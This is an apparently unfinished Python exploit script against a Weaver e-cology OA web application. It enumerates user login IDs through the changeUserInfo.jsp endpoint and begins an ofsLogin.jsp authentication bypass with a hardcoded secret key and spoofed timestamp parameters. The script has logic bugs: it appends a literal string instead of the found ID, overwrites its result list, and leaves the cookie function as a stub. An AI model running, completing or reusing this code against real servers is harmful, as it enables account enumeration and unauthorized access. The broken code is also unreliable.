import json
import requests
import argparse
from urllib.parse import urlparse


headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-us;q=0.8",
    "Cache-Control": "max-age=0",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Connection": "close",
}


def loginIdScan(url, uid):
    path = "/mobile/plugin/changeUserInfo.jsp?type=getUserid&loginId={}".format(uid)
    parsed_url = urlparse(url)
    url = parsed_url.scheme + "://" + parsed_url.netloc + path
    print(url)
    try:
        response = requests.get(url, headers=headers)
        data = json.loads(response.text)
        if data.get("loginId"):
            loginIds.append("loginId")
    except:
        print('[+] {}, 可能不存在漏洞！'.format(url))
        exit()


def getCookie():
    timestamp = "1"
    syscode = "1"
    secret_key = "u6skkR"
    receiver = ""
    loginTokenFromThird = ""
    path = "/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver={}&loginTokenFromThird={}".format(receiver, loginTokenFromThird)
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Read file line by line.')
    parser.add_argument('-f', '--file', type=str, required=True, help='uid.txt')
    parser.add_argument('-u', '--target', type=str, required=True, help='url')
    args = parser.parse_args()

    if not (args.file and args.target):
        parser.print_help()
        exit()

    with open(args.file) as file:
        loginIds = []
        for line in file:
            loginIds = loginIdScan(args.target, line.strip())
        print(loginIds)





